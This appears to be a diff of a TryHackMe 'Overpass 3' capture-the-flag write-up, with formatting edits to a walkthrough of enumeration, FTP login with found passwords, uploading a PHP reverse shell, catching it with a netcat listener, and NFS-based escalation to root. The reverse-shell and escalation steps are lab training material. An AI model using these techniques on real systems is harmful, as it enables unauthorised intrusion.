@@ -6,6 +6,8 @@
 
 ---
 
+[Click Here](https://tryhackme.com/room/overpass3hosting) to go to the TryHackMe room.
+
 ## Enumeration
 
 ### Nmap
@@ -37,7 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 587.16 seconds
 ### Gobuster
 
 ```bash
-gobuster dir -u http://10.10.213.153 -w /usr/share/wordlists/dirb/common.txt
+$ gobuster dir -u http://10.10.213.153 -w /usr/share/wordlists/dirb/common.txt
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -124,7 +126,7 @@ CustomerDetails.xlsx: Microsoft Excel 2007+
 ## Login into FTP
 
 - By using the passwords recently found, we can try to login into to ftp server.
-- **P.S:** The passwords didn't work for ssh
+- **P.S:** The passwords didn't work for `ssh`.
 
 ### Login as paradox
 
@@ -184,11 +186,11 @@ local: php-reverse-shell.php remote: reverse-shell.php
 
 ## Initial shell
 
-- Listen on the appropriate port using netcat
+- Listen on the appropriate port using `netcat`.
 - Visit `http://10.10.213.153/reverse-shell.php` on the browser to get a reverse shell.
 
 ```bash
-nc -lvnp 1234
+$ nc -lvnp 1234
 listening on [any] 1234 ...
 connect to [10.17.7.91] from (UNKNOWN) [10.10.213.153] 44754
 Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
@@ -338,7 +340,7 @@ program vers proto   port  service
 
 --- 
 
-## User.flag
+## User Flag
 
 - Mount the NFS to the attacker machine.
 - Now we have **read, write** permission inside that NFS.
@@ -428,7 +430,7 @@ root
 
 ---
 
-## Root.flag
+## Root Flag
 
 ```bash
 bash-5.1# cd /root/
